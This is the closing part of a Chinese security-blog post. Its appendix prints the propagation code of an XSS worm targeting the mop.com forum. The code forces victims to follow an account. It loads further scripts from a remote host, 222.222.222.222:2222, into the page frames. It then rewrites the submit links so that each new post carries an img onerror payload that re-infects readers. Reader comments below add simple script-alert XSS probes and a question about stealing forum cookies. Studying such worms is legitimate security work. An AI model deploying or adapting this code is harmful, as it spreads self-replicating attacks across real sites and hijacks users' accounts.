&nbsp; &nbsp; e)各位请轻砸！毕竟手敲这多字不容易，搞到今早四点多，还好有3D陪伴。。 <br />
 <br />
附录 <br />
&nbsp; &nbsp; 这里是蠕虫的传播代码，具有攻击性的代码已经去除</P>
<P>
<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
<TBODY>
<TR>
<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">xss worm.txt：</FONT></P>
<P> <br />
///////////////////////////////////// <br />
//远程注入js文件：13.j <br />
// <br />
///////////////////////////////////// <br />
var kt; <br />
if(kt!="I lvoe kunting!Just for fun!") <br />
{ <br />
&nbsp;kt="I lvoe kunting!Just for fun!"; <br />
&nbsp;function addLoadEvent(func) <br />
&nbsp;{  <br />
&nbsp;&nbsp;var oldfunc=window.onload;  <br />
&nbsp;&nbsp;if(typeof(window.onload)!="function"){  <br />
&nbsp;&nbsp;&nbsp;window.onload=func; <br />
&nbsp;&nbsp;} <br />
&nbsp;&nbsp;else{  <br />
&nbsp;&nbsp;&nbsp;window.onload=function() <br />
&nbsp;&nbsp;&nbsp;{  <br />
&nbsp;&nbsp;&nbsp;&nbsp;oldfunc();  <br />
&nbsp;&nbsp;&nbsp;&nbsp;func();  <br />
&nbsp;&nbsp;&nbsp;}  <br />
&nbsp;&nbsp;}  <br />
&nbsp;} <br />
&nbsp; <br />
&nbsp;function sleep(numberMillis) { <br />
&nbsp;&nbsp;var now = new Date(); <br />
&nbsp;&nbsp;var exitTime = now.getTime() + numberMillis; <br />
&nbsp;&nbsp;while (true) { <br />
&nbsp;&nbsp;&nbsp;now = new Date(); <br />
&nbsp;&nbsp;&nbsp;if (now.getTime() &gt; exitTime) <br />
&nbsp;&nbsp;&nbsp;&nbsp;return; <br />
&nbsp;&nbsp;} <br />
&nbsp;} <br />
&nbsp; <br />
&nbsp;function createXMLHttpRequest() <br />
&nbsp;{ <br />
&nbsp;&nbsp;if(window.XMLHttpRequest)  <br />
&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;request = new XMLHttpRequest(); <br />
&nbsp;&nbsp;&nbsp;if(request.overrideMimeType)  <br />
&nbsp;&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;&nbsp; request.overrideMimeType('text/xml'); <br />
&nbsp;&nbsp;&nbsp;} <br />
&nbsp;&nbsp;} <br />
&nbsp;&nbsp;else if(window.ActiveXObject)  <br />
&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP']; <br />
&nbsp;&nbsp;&nbsp;for(var i=0; i&lt;versions.length; i++)  <br />
&nbsp;&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;&nbsp;try  <br />
&nbsp;&nbsp;&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request = new ActiveXObject(versions[i]); <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(request)  <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return request; <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} <br />
&nbsp;&nbsp;&nbsp;&nbsp;}  <br />
&nbsp;&nbsp;&nbsp;&nbsp;catch(e) {} <br />
&nbsp;&nbsp;&nbsp;} <br />
&nbsp;&nbsp;} <br />
&nbsp;&nbsp;return request; <br />
&nbsp;} <br />
&nbsp;/* <br />
&nbsp;function delXHR() <br />
&nbsp;{ <br />
&nbsp;&nbsp;if(xmlHttp.readyState == 4) { <br />
&nbsp;&nbsp;&nbsp;if(xmlHttp.status == 200) { <br />
&nbsp;&nbsp;&nbsp;&nbsp;if(xmlHttp) <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delete(xmlHttp); <br />
&nbsp;&nbsp;&nbsp;&nbsp;} <br />
&nbsp;&nbsp;&nbsp;} <br />
&nbsp;&nbsp;&nbsp;&nbsp; <br />
&nbsp;} <br />
&nbsp;*/ <br />
&nbsp;function postFollow(xmlHttp,url,strcontent) <br />
&nbsp;{ <br />
&nbsp;&nbsp;xmlHttp.onreadystatechange = null; <br />
&nbsp;&nbsp;xmlHttp.open('POST',url,true);xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');&nbsp; <br />
&nbsp;&nbsp;xmlHttp.setRequestHeader('Content-length', '33');xmlHttp.setRequestHeader('Referrer', 'http://dzh.mop.com/'); <br />
&nbsp;&nbsp;xmlHttp.send(strcontent); <br />
&nbsp;} <br />
&nbsp; <br />
&nbsp;var xmlFollow=createXMLHttpRequest(); <br />
&nbsp;postFollow(xmlFollow,'http://dzh.mop.com:80/mopper/follow.do','targetId=431139529&amp;operation=true'); <br />
&nbsp;delete(xmlFollow); <br />
&nbsp; <br />
&nbsp;function createHij() <br />
&nbsp;{ <br />
//&nbsp;&nbsp;parent.document.hijtest(); <br />
&nbsp;&nbsp;var topscript = parent.document.createElement("script"); <br />
&nbsp;&nbsp;parent.document.body.appendChild(topscript); <br />
&nbsp;&nbsp;topscript.src = "http://222.222.222.222:2222/hij.js"; <br />
&nbsp;} <br />
&nbsp;addLoadEvent(createHij); <br />
}</P>
<P>&nbsp;</P>
<P>////////////////////////////////////////////////// <br />
// <br />
//注入到主框架js脚本文件名：hij.js <br />
////////////////////////////////////////////////// <br />
function creatScript() <br />
{ <br />
&nbsp;if(!document.getElementById("rightframe")||!document.frames["rightframe"]) <br />
&nbsp;&nbsp;return; <br />
&nbsp;var rightframe = document.getElementById("rightframe").contentDocument || document.frames["rightframe"].document; <br />
&nbsp;if(rightframe.getElementById("kunting520")==null) <br />
&nbsp;{; <br />
&nbsp;&nbsp;var s=document.createElement("script"); <br />
&nbsp;&nbsp;s.setAttribute("id","kunting520"); <br />
&nbsp;&nbsp;s.src="http://222.222.222.222:2222/kt.js"; <br />
&nbsp;&nbsp;rightframe.body.appendChild(s); <br />
&nbsp;} <br />
} <br />
setInterval(creatScript,20000);</P>
<P>&nbsp;</P>
<P>////////////////////////////////////////////////// <br />
// <br />
//从主框架中再注入到子框架js脚本文件名：kt.js <br />
//////////////////////////////////////////////////</P>
<P>var InjectFlag = 0; <br />
var hostUrl ="http://dzh.mop.com"; <br />
var endUrl = null; <br />
var kt; <br />
var endHttp;</P>
<P>function createXMLHttpRequest() <br />
{ <br />
&nbsp;if(window.XMLHttpRequest)  <br />
&nbsp;{ <br />
&nbsp;&nbsp;request = new XMLHttpRequest(); <br />
&nbsp;&nbsp;if(request.overrideMimeType)  <br />
&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;request.overrideMimeType('text/xml'); <br />
&nbsp;&nbsp;} <br />
&nbsp;} <br />
&nbsp;else if(window.ActiveXObject)  <br />
&nbsp;{ <br />
&nbsp;&nbsp;var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP']; <br />
&nbsp;&nbsp;for(var i=0; i&lt;versions.length; i++)  <br />
&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;try  <br />
&nbsp;&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;&nbsp;request = new ActiveXObject(versions[i]); <br />
&nbsp;&nbsp;&nbsp;&nbsp;if(request)  <br />
&nbsp;&nbsp;&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return request; <br />
&nbsp;&nbsp;&nbsp;&nbsp;} <br />
&nbsp;&nbsp;&nbsp;}  <br />
&nbsp;&nbsp;&nbsp;catch(e) {} <br />
&nbsp;&nbsp;} <br />
&nbsp;} <br />
&nbsp;return request; <br />
} <br />
&nbsp; <br />
function isInject() <br />
{ <br />
&nbsp;if(endHttp.readyState == 4) { <br />
&nbsp;&nbsp;if(endHttp.status == 200) { <br />
&nbsp;&nbsp;&nbsp;var endpage=new String(endHttp.responseText); <br />
&nbsp;&nbsp;&nbsp;if(!endpage.indexOf("http://kunting520.jpg")) <br />
&nbsp;&nbsp;&nbsp;&nbsp;InjectFlag = 1; <br />
&nbsp;&nbsp;} <br />
&nbsp;} <br />
}</P>
<P> <br />
for(var k =0;k&lt;document.links.length;k++) <br />
{ <br />
&nbsp;if(document.links[k].getAttribute("class")=="endgray") <br />
&nbsp;{ <br />
&nbsp;&nbsp;endUrl = hostUrl + document.links[k].href; <br />
&nbsp;&nbsp;break; <br />
&nbsp;} <br />
} <br />
&nbsp; <br />
if(endUrl == null) <br />
{ <br />
&nbsp;if(kt !="I lvoe kunting!Just for fun!") <br />
&nbsp;&nbsp;InjectFlag = 1; <br />
} <br />
else <br />
{ <br />
&nbsp;endHttp = createXMLHttpRequest(); <br />
&nbsp;endHttp.onreadystatechange = isInject; <br />
&nbsp;endHttp.open('GET',endUrl,false); <br />
&nbsp;endHttp.send(null); <br />
}</P>
<P>if(InjectFlag == 1) <br />
{ <br />
&nbsp;function hijack() <br />
&nbsp;{ <br />
&nbsp;&nbsp;var oRTE = document.frames ? document.frames["content"] : document.getElementById("content").contentWindow;</P>
<P>&nbsp;&nbsp;var&nbsp;body = oRTE.document.body.innerHTML ; <br />
&nbsp;&nbsp; <br />
&nbsp;&nbsp;oRTE.document.body.innerHTML = body+"&lt;img src=\"http://kunting520.jpg\" onerror='javascript:var s=document.createElement(\"script\");s.src=\"http://222.222.222.222:2222/13.js\";document.body.appendChild(s);'"; <br />
&nbsp;} <br />
&nbsp;&nbsp; <br />
&nbsp;function hijackLinks() <br />
&nbsp;{ <br />
&nbsp;&nbsp;var as=document.links; <br />
&nbsp;&nbsp;for(var i=0;i&lt;as.length;i++){ <br />
&nbsp;&nbsp;&nbsp;if(as[i].href=="javascript:MOP.DZH.formSubmitNormal();") <br />
&nbsp;&nbsp;&nbsp;{ <br />
&nbsp;&nbsp;&nbsp;&nbsp;as[i].href="javascript:hijack();MOP.DZH.formSubmitNormal();"; <br />
&nbsp;&nbsp;&nbsp;} <br />
&nbsp;&nbsp;} <br />
&nbsp;} <br />
&nbsp; <br />
&nbsp;hijackLinks(); <br />
}</P></TD></TR></TBODY></TABLE></P>
<p><strong>留言评论（旧系统）：</strong></p>
<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
<blockquote id="7378,1488,123.8.106.141">
<p>alert(1); @ 2015-01-26 20:36:01</p>
<p style="text-indent:2em">&lt;script&gt;alert(1)&lt;/script&gt;</p>
<p>本站回复：</p>
<p style="text-indent:2em">&lt;script&gt;alert(1)&lt;/script&gt;</p>
</blockquote>
<blockquote id="7541,1488,115.26.4.1">
<p>n倒萨 @ 2015-04-15 21:05:07</p>
<p style="text-indent:2em">&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;&quot;</p>
<p>本站回复：</p>
<p style="text-indent:2em">&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;&quot;</p>
</blockquote>
<blockquote id="7765,1488,116.228.6.140">
<p>佚名 @ 2015-08-03 16:37:43</p>
<p style="text-indent:2em">&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt;&amp;lt;&amp;quot;</p>
<p>本站回复：</p>
<p style="text-indent:2em">alert(&#39;xss&#39;)</p>
</blockquote>
<blockquote id="7961,1488,111.6.132.144">
<p>佚名 @ 2015-10-25 17:02:31</p>
<p style="text-indent:2em">请教下博主，DZ论坛的的XSS怎么抓不到cookies</p>
<p>本站回复：</p>
<p style="text-indent:2em">百度：HTTP-only</p>
</blockquote>
</div>
    </div>

    
    
<div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">Nuclear'Atk</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
      2011-06-22
      
    </span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">许可协议</span>
    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
  </p>
</div>


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://lcx.cc/tags/xss/">XSS</a>
          <a href="https://lcx.cc/tags/0day/">0day</a>
          <a href="https://lcx.cc/tags/app/">app</a>
          <a href="https://lcx.cc/tags/asp/">ASP</a>
          <a href="https://lcx.cc/tags/css/">CSS</a>
          <a href="https://lcx.cc/tags/ctf/">CTF</a>
          <a href="https://lcx.cc/tags/dz/">DZ</a>
          <a href="https://lcx.cc/tags/exp/">EXP</a>
          <a href="https://lcx.cc/tags/flash/">FLASH</a>
          <a href="https://lcx.cc/tags/hijack/">hijack</a>
          <a href="https://lcx.cc/tags/html/">Html</a>
          <a href="https://lcx.cc/tags/http/">HTTP</a>
          <a href="https://lcx.cc/tags/ie/">IE</a>
          <a href="https://lcx.cc/tags/ip/">IP</a>
          <a href="https://lcx.cc/tags/java/">Java</a>
          <a href="https://lcx.cc/tags/js/">js</a>
          <a href="https://lcx.cc/tags/microsoft/">Microsoft</a>
          <a href="https://lcx.cc/tags/net/">Net</a>
          <a href="https://lcx.cc/tags/pos/">POS</a>
          <a href="https://lcx.cc/tags/shell/">Shell</a>
          <a href="https://lcx.cc/tags/url/">URL</a>
          <a href="https://lcx.cc/tags/web/">Web</a>
          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8/">安全</a>
          <a href="https://lcx.cc/tags/%E5%8D%9A%E5%AE%A2/">博客</a>
          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
          <a href="https://lcx.cc/tags/%E6%9F%A5%E6%89%BE/">查找</a>
          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
          <a href="https://lcx.cc/tags/%E6%81%B6%E6%84%8F/">恶意</a>
          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a>
          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
          <a href="https://lcx.cc/tags/%E6%94%BB%E5%87%BB/">攻击</a>
          <a href="https://lcx.cc/tags/%E7%AE%A1%E7%90%86/">管理</a>
          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
          <a href="https://lcx.cc/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
          <a href="https://lcx.cc/tags/%E5%8A%AB%E6%8C%81/">劫持</a>
          <a href="https://lcx.cc/tags/%E5%AE%A2%E6%88%B7%E7%AB%AF/">客户端</a>
          <a href="https://lcx.cc/tags/%E8%B7%A8%E7%AB%99/">跨站</a>
          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
          <a href="https://lcx.cc/tags/%E8%AE%BA%E5%9D%9B/">论坛</a>
          <a href="https://lcx.cc/tags/%E7%BB%95%E8%BF%87/">绕过</a>
          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
          <a href="https://lcx.cc/tags/%E6%80%9D%E8%B7%AF/">思路</a>
          <a href="https://lcx.cc/tags/%E8%AE%A8%E8%AE%BA/">讨论</a>
          <a href="https://lcx.cc/tags/%E7%BD%91%E7%AB%99/">网站</a>
          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
          <a href="https://lcx.cc/tags/%E9%82%AE%E4%BB%B6/">邮件</a>
          <a href="https://lcx.cc/tags/%E9%82%AE%E7%AE%B1/">邮箱</a>
          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%85%A5/">注入</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/1492/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">巴西政府成黑客攻击最新受害者</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        
          <a class="next" href="/post/1487/">
            <span class="next-text nav-default">黑客组织再袭FBI合作伙伴网站</span>
            <span class="prev-text nav-mobile">下一篇</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  

  
  

  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="linkedin"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="33" height="33">
  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="weibo"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="zhihu"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="douban"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
</svg>

    </a>


<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">

  

  <span class="copyright-year">
    &copy;
    
      2010 -
    2025
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        Nuclear'Atk（核攻击）网络安全实验室
        
      </span></span>

  
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
